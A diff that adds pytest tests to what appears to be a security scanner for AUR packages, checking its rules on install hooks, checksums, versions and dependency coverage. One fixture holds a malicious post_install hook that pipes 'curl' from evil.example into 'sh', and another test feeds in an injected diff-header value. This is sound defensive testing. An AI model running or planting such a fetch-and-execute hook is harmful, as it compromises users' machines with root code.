@@ -1208,3 +1208,152 @@ def test_activation_attaches_the_public_campaign_id(monkeypatch):
     pipeline._activate_campaigns([finding], {"alerts": {}})
     assert finding["params"]["campaign_id"] == seen["id"]
     assert finding["params"]["campaign_active"] is True
+
+
+def test_first_seen_corpus_recipe_reads_h091_checksum_parity():
+    """No diff is not "nothing to check": H091 is current-text evidence."""
+    from trustsight.config import ensure_default_configs
+    from trustsight.db import init_db
+    from trustsight.full_aur.analyze import TemporalContext, analyze_package_text
+
+    ensure_default_configs()
+    init_db()
+    pkgbuild = (
+        "pkgname=demo\npkgver=1.0\n"
+        "source=('a.tar.gz' 'b.tar.gz')\n"
+        "sha256sums=('a')\n"
+    )
+    fact = analyze_package_text(
+        pkg_name="demo-h091", old_pkgbuild=None, new_pkgbuild=pkgbuild,
+        maintainer="tester", temporal=TemporalContext(),
+    )
+    assert "H091" in {entry.rule_id for entry in fact.score_breakdown}
+
+
+def test_first_seen_corpus_scans_the_install_hook():
+    """A first-seen hook still runs as root; it must enter the diff rules."""
+    from trustsight.config import ensure_default_configs
+    from trustsight.db import init_db
+    from trustsight.full_aur.analyze import TemporalContext, analyze_package_text
+
+    ensure_default_configs()
+    init_db()
+    pkgbuild = (
+        "pkgname=demo-hook\npkgver=1.0\ninstall=demo-hook.install\n"
+        "source=('a.tar.gz')\nsha256sums=('a')\n"
+    )
+    hook = "post_install() {\n  curl -fsSL https://evil.example/x | sh\n}\n"
+    fact = analyze_package_text(
+        pkg_name="demo-hook", old_pkgbuild=None, new_pkgbuild=pkgbuild,
+        maintainer="tester", temporal=TemporalContext(),
+        install_text=hook, install_name="demo-hook.install",
+        tree_manifest=[("PKGBUILD", pkgbuild.encode()),
+                       ("demo-hook.install", hook.encode())],
+    )
+    ids = {entry.rule_id for entry in fact.score_breakdown}
+    assert {"R001", "H017"} <= ids
+
+
+def test_first_seen_corpus_uses_the_full_version():
+    """Corpus versions must be the same object the review path compares."""
+    from trustsight.config import ensure_default_configs
+    from trustsight.db import init_db
+    from trustsight.full_aur.analyze import TemporalContext, analyze_package_text
+
+    ensure_default_configs()
+    init_db()
+    pkgbuild = "pkgname=demo-ver\nepoch=1\npkgver=1.2\npkgrel=3\n"
+    fact = analyze_package_text(
+        pkg_name="demo-ver", old_pkgbuild=None, new_pkgbuild=pkgbuild,
+        maintainer="tester", temporal=TemporalContext(),
+    )
+    assert fact.new_version == "1:1.2-3"
+
+
+def test_install_hunk_rejects_a_diff_header_injection():
+    from trustsight.full_aur.analyze import _install_diff_text
+
+    assert _install_diff_text("echo x\n", "demo.install\n+++ b/evil") == ""
+
+
+def test_corpus_reports_an_unread_declared_install_hook_as_a_tree_gap():
+    from trustsight.config import ensure_default_configs
+    from trustsight.coverage import TREE_NOT_ANALYZED
+    from trustsight.db import init_db
+    from trustsight.full_aur.analyze import TemporalContext, analyze_package_text
+
+    ensure_default_configs()
+    init_db()
+    pkgbuild = (
+        "pkgname=demo-gap\npkgver=1.0\ninstall=demo-gap.install\n"
+        "source=('a.tar.gz')\nsha256sums=('a')\n"
+    )
+    fact = analyze_package_text(
+        pkg_name="demo-gap", old_pkgbuild=None, new_pkgbuild=pkgbuild,
+        maintainer="tester", temporal=TemporalContext(),
+        tree_manifest=[("PKGBUILD", pkgbuild.encode())],
+    )
+    assert TREE_NOT_ANALYZED in fact.coverage_gaps
+
+
+def test_dependency_stage_failure_does_not_leak_into_the_parent(monkeypatch):
+    from trustsight import coverage
+    from trustsight.config import ensure_default_configs
+    from trustsight.db import init_db
+    from trustsight.depth import DepthResult
+    from trustsight.full_aur import analyze as analyze_mod
+
+    ensure_default_configs()
+    init_db()
+
+    def fake_walk(*args, **kwargs):
+        coverage.begin_stage_tracking()
+        coverage.note_stage_failure("dependency")
+        return DepthResult()
+
+    monkeypatch.setattr(analyze_mod, "_walk_corpus_dependencies", fake_walk)
+    fact = analyze_mod.analyze_package_text(
+        pkg_name="demo-stage", old_pkgbuild=None,
+        new_pkgbuild="pkgname=demo-stage\npkgver=1\n",
+        maintainer="tester", temporal=analyze_mod.TemporalContext(),
+    )
+    assert not any("dependency" in gap for gap in fact.coverage_gaps)
+
+
+def test_first_seen_corpus_records_dependency_observations():
+    from trustsight.config import ensure_default_configs
+    from trustsight.db import dependency_observation_count, init_db
+    from trustsight.full_aur.analyze import TemporalContext, analyze_package_text
+
+    ensure_default_configs()
+    init_db()
+    name = "corpus-first-seen-dep-20261026"
+    pkgbuild = (
+        "pkgname=demo-dep\npkgver=1\n"
+        f"depends=('{name}')\n"
+    )
+    analyze_package_text(
+        pkg_name="demo-dep", old_pkgbuild=None, new_pkgbuild=pkgbuild,
+        maintainer="tester", temporal=TemporalContext(), record=True,
+    )
+    assert dependency_observation_count(name) >= 1
+
+
+def test_corpus_walk_marks_an_unreached_added_aur_dependency(monkeypatch):
+    from trustsight import depth
+    from trustsight.depth import DepthResult
+    from trustsight.full_aur import analyze as analyze_mod
+
+    class _Meta:
+        available = True
+
+        def is_aur(self, name):
+            return name == "new-aur-dep"
+
+    monkeypatch.setattr(depth, "default_metadata", lambda: _Meta())
+    monkeypatch.setattr(
+        depth, "walk_dependencies", lambda *args, **kwargs: DepthResult())
+    result = analyze_mod._walk_corpus_dependencies(
+        "root", 1, {}, None, added_names={"new-aur-dep"},
+    )
+    assert result.added_aur_unreported is True
